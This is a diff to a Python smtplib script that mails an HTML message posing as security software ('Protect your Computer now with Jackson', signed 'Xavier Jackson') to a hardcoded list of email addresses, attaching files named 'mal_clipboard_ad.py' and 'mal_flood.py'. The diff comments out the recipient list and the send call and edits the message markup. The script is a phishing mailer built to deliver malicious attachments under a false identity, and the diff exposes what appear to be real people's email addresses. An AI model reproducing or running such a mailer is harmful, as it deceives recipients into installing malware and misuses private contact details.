@@ -4,8 +4,8 @@ from email.mime.base import MIMEBase
 from email import encoders 
 import smtplib
 
-emails = ['gncis8@gmail.com','gncis@yahoo.com','samreenansari1998@gmail.com']
-files = ['mal_clipboard_ad.py','mal_flood.py']
+#emails = ['gncis8@gmail.com','gncis@yahoo.com','samreenansari1998@gmail.com']
+#files = ['mal_clipboard_ad.py','mal_flood.py']
 
 def send_email(emails,files):
 	server = smtplib.SMTP('smtp.gmail.com', 587) #to connect with the smtp gmail server
@@ -17,7 +17,7 @@ def send_email(emails,files):
 	msg = MIMEMultipart()
 	msg['Subject'] = 'Protect your Computer now with Jackson'
 	msg['From'] = "jacksonsoftwaresolutions@gmail.com"
-	msg['To'] = ','.join(emails)
+	msg['To'] = emails
 
 	html_txt = """
 	<html>
@@ -33,8 +33,8 @@ def send_email(emails,files):
 			using your computer.
 			</p>
 
-			<h4>Yours Faithfully /n
-			Xavier Jackson</h4>
+			<p><b>Yours Faithfully<br>
+			Xavier Jackson<b></p>
 			
 		</body>
 	</html>
@@ -70,4 +70,4 @@ def send_email(emails,files):
 	# terminating the session 
 	server.quit() 
 
-send_email(emails,files)
+#send_email(emails,files)
